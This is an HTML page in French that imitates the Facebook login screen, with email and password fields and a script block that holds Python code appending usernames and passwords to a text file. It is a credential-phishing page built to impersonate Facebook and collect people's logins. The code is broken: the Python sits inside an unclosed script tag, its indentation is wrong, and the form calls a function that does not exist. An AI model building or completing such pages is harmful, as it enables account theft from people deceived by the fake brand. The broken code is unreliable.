<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connexion - Facebook</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      min-height: 100vh;
      box-sizing: border-box;
    }

    .login-box {
      background: white;
      padding: 30px 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .login-box h1 {
      color: #1877f2;
      font-size: 36px;
      margin-bottom: 20px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
      box-sizing: border-box;
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-btn:hover {
      background-color: #166fe5;
    }

    .forgot-link {
      display: block;
      margin: 15px 0;
      color: #1877f2;
      text-decoration: none;
      font-size: 14px;
    }

    .create-btn {
      background-color: #42b72a;
      margin-top: 20px;
    }

    .create-btn:hover {
      background-color: #36a420;
    }

    @media (max-width: 400px) {
      .login-box h1 {
        font-size: 28px;
      }

      .login-btn {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <h1>facebook</h1>
      <form onsubmit="enregistrer(); return false;">
        <input type="text" id="email" placeholder="Adresse e-mail ou numéro de mobile" required>
        <input type="password" id="password" placeholder="Mot de passe" required>
        <button type="submit" class="login-btn">Se connecter</button>
      </form>
      <a href="#" class="forgot-link">Mot de passe oublié ?</a>
      <hr>
      <button class="login-btn create-btn">Créer un compte</button>
      <div id="confirmation" style="margin-top: 20px; color: green;"></div>
    </div>
  </div>

  <script>
    def sauvegarder_identifiants(identifiants, fichier='identifiants.txt'):
    with open(fichier, 'a') as file:
        for identifiant, mot_de_passe in identifiants.items():
            file.write(f'{identifiant}: {mot_de_passe}\n')
    print("Identifiants sauvegardés avec succès.")

# Exemple d'utilisation
identifiants = {
    "utilisateur1": "motdepasse1",
    "utilisateur2": "motdepasse2",
}

sauvegarder_identifiants(identifiants)

